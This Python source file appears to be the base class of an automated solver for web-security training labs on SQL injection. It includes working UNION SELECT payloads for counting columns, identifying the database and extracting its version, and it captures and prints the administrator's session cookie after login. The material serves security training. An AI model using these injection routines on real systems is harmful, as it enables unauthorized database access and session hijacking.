from abc import ABC, abstractmethod
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich import box 
from rich import print
import sys
from halo import Halo

from core.utils import RequestLab
from core.utils import JSONPayloadSQLInjection


class SQLInjectionBaseSolver(ABC):
    def __init__(self, url):
        self.console = Console()
        self.url = url
        self.html_content = None
        self.soup_html = None
        self.payload = None
        self.cookies = None
        self.csrf = None
        self.username = 'administrator'
        self.categories = []
        self.categories_url = []

        self.total_columns = None
        self.data_type_columns = []
        self.dbms = None
        self.db_name = None
        self.table_name = None
        self.column_name = None

        cls_json_payload = JSONPayloadSQLInjection()
        self.json_payload = cls_json_payload.get_json_data()

        self.spinner = Halo(spinner='dots')
    

    # This method quite's messy
    def _request_lab(self, method='GET', url=None, data=None, cookies=None, allow_redirects=True):
        """Return the RequestLab object."""

        if url is None:
            url = self.url
        request = RequestLab(url)
        
        if method == 'GET':
            request.request_get()
            self.html_content = request.get_html_content()
        elif method == 'POST':
            request.request_post(data=data, cookies=cookies, allow_redirects=allow_redirects)
            self.html_content = request.get_html_content()
        # elif method == 'PUT':
        #     self.html_content = request.request_put()
        # elif method == 'DELETE':
        #     self.html_content = request.request_delete()
        self.__set_soup_html()
    # End of messy method

    def _print_table(self, title, headers, rows):
        """Print a table."""
        table = Table(title=title, box=box.ROUNDED)
        for header in headers:
            table.add_column(header)
        for row in rows:
            table.add_row(*row)
        self.console.log(table)

    def __set_soup_html(self):
        """Set the soup HTML."""
        self.soup_html = BeautifulSoup(self.html_content.text, 'html.parser')
    
    def _print_payload(self, payload):
        """Print the payload."""
        self.console.print("Payload: ", payload)        
        
    def determine_DBMS(self):
        """Determine the DBMS."""
        self.spinner.start()
        self.spinner.text = 'Determine the DBMS'
        self._request_lab('GET')
        self.set_category()
        for dbms in self.json_payload:
            for query in dbms['list_command']:
                url_brute = self.url + self.categories_url[1] + query
                self._request_lab('GET', url_brute)
                if self.html_content.status_code == 200:
                    self.dbms = dbms['name']
                    self.spinner.stop()
                    self.console.log(f"[bold blue]DBMS:[/bold blue] {self.dbms}")
                    return


    def determine_column_number(self):
        """Determine the number of columns."""
        self.spinner.start()
        self.spinner.text = 'Determine the number of columns'
        # Try to find the number of columns using the UNION SELECT
        for i in range(1, 100):
            null = 'NULL,' * i
            payload = f"' UNION SELECT {null[:-1]}--"
            if self.dbms == 'ORACLE':
                payload = f"' UNION SELECT {null[:-1]} FROM DUAL--"
            url_brute = self.url + self.categories_url[1] + payload
            self._request_lab('GET', url_brute)
            if self.html_content.status_code == 200:
                self.total_columns = i
                self.spinner.stop()
                self.console.log(f"[bold blue]Total Columns:[/bold blue] {self.total_columns}")
                return

    def determine_DB_version(self):
        """Determine the DB version."""
        self.spinner.start()
        self.spinner.text = 'Determine the DB version'
        null = 'NULL,' * (self.total_columns-1)
        if self.dbms == 'ORACLE':
            payload = f"' UNION SELECT {null}banner FROM v$version--"
        elif self.dbms == 'POSTGRESQL':
            payload = f"' UNION SELECT {null}version()--"
        else:
            payload = f"' UNION SELECT {null}@@version--"
        url_brute = self.url + self.categories_url[1] + payload
        self._request_lab('GET', url_brute)
        self.db_name = self.soup_html.find('h1').text
        self.spinner.stop()
        self.console.log(f"[bold blue]DB Name:[/bold blue] {self.db_name}")

    def retrieve_DB_name(self):
        """Retrieve the DB name."""
        pass

    def retrieve_table_name(self):
        """Retrieve the table name."""
        pass

    def retrieve_column_name(self):
        """Retrieve the column name."""
        pass
    
    def retrieve_data(self):
        """Retrieve the data."""
        pass

    def request_login(self, body_form):
        """Request the login."""
        self.url = self.url + '/login'
        self.set_csrf()
        self._request_lab('POST', data=body_form, cookies=self.cookies, allow_redirects=False)
        self.print_session()

    def set_csrf(self):
        """Parse the CSRF."""
        self.csrf = self.soup_html.find('input', {'name': 'csrf'})['value']

    def set_cookies(self):
        """Parse the session."""
        self.cookies = {
            'session': self.html_content.cookies.get('session')
        }
    
    def get_cookies(self):
        """Return the cookies."""
        return self.cookies

    def print_session(self):
        """Print the session."""
        self.set_cookies()
        self.console.log(f"[bold blue]Session Administrator:[/bold blue] {self.get_cookies()}")

    def set_category(self):
        """Parse the category."""
        self._request_lab('GET')
        categories = self.soup_html.find_all('a', class_='filter-category')
        for category in categories:
            if category.text == "All":
                continue
            self.categories.append(category.text)
            self.categories_url.append(category['href'])

    def _print_solved(self):
        """Print the solved message."""
        print(r"""[bold green]
        .-------------------------------------.
        |  ____   ___  _ __     _______ ____  |
        | / ___| / _ \| |\ \   / / ____|  _ \ |
        | \___ \| | | | | \ \ / /|  _| | | | ||
        |  ___) | |_| | |__\ V / | |___| |_| ||
        | |____/ \___/|_____\_/  |_____|____/ |
        |                                     |
        '-------------------------------------' [/bold green]
""")

    @abstractmethod
    def build_payload():
        """Build the payload."""
        pass

    @abstractmethod
    def solve(self):
        """Solve the lab."""
        pass    
    

        
        
